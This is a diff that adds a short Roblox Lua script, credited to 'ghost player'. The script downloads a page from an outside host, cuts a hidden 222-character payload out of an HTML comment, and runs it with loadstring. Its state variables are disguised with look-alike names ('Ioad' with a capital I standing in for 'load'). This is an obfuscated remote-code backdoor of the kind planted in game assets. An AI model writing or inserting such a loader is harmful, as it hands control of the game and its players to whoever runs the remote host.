@@ -1,0 +1,14 @@
+-- by ghost player
+local website = game:HttpGet("http://zte.ct.ws/")
+
+if Ioad == nil or IoadClone == nil then
+   Ioad = nil
+   loadstring(website:sub(website.find(website, "<!--") + 4, website.find(website, "<!--") + 4 + 222))()
+   if IoadClone == nil and Ioad ~= nil then
+      IoadClone = Ioad
+   end
+end
+
+if Ioad ~= IoadClone then
+   Ioad = IoadClone
+end
